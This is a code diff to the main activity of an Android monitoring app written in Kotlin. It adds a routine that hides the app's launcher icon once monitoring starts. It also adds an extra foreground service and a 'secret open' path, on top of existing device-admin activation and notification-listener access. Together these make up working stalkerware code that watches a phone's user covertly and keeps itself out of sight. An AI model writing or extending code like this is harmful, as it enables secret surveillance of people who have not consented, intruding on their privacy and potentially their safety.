@@ -30,22 +30,43 @@ class MainActivity : AppCompatActivity() {
         val statusText = findViewById<TextView>(R.id.statusText)
         val btnActivate = findViewById<Button>(R.id.btnActivate)
 
+        // Secret open se aaya hai toh seedha monitoring shuru
+        if (intent.getBooleanExtra("secret_open", false)) {
+            statusText.text = "✅ Monitoring Active"
+        }
+
         btnActivate.setOnClickListener {
             if (checkPermissions()) {
                 startMonitoringService()
+                startVolumeService()
                 activateDeviceAdmin()
                 checkNotificationPermission()
-                statusText.text = "✅ Monitoring Active"
+                hideAppIcon()
+                statusText.text = "✅ Monitoring Active — Icon Hidden"
             } else {
                 requestPermissions()
             }
         }
     }
 
+    private fun hideAppIcon() {
+        val pm = packageManager
+        val componentName = ComponentName(this, MainActivity::class.java)
+        pm.setComponentEnabledSetting(
+            componentName,
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+
+    private fun startVolumeService() {
+        val intent = Intent(this, VolumeService::class.java)
+        startForegroundService(intent)
+    }
+
     private fun checkNotificationPermission() {
         val enabledListeners = Settings.Secure.getString(
-            contentResolver,
-            "enabled_notification_listeners"
+            contentResolver, "enabled_notification_listeners"
         )
         val componentName = ComponentName(this, NotificationListener::class.java).flattenToString()
         if (enabledListeners == null || !enabledListeners.contains(componentName)) {
@@ -81,16 +102,17 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startMonitoringService() {
-        val intent = Intent(this, MonitoringService::class.java)
-        startForegroundService(intent)
+        startForegroundService(Intent(this, MonitoringService::class.java))
     }
 
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == PERMISSION_CODE && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
             startMonitoringService()
+            startVolumeService()
             activateDeviceAdmin()
             checkNotificationPermission()
+            hideAppIcon()
         }
     }
 }
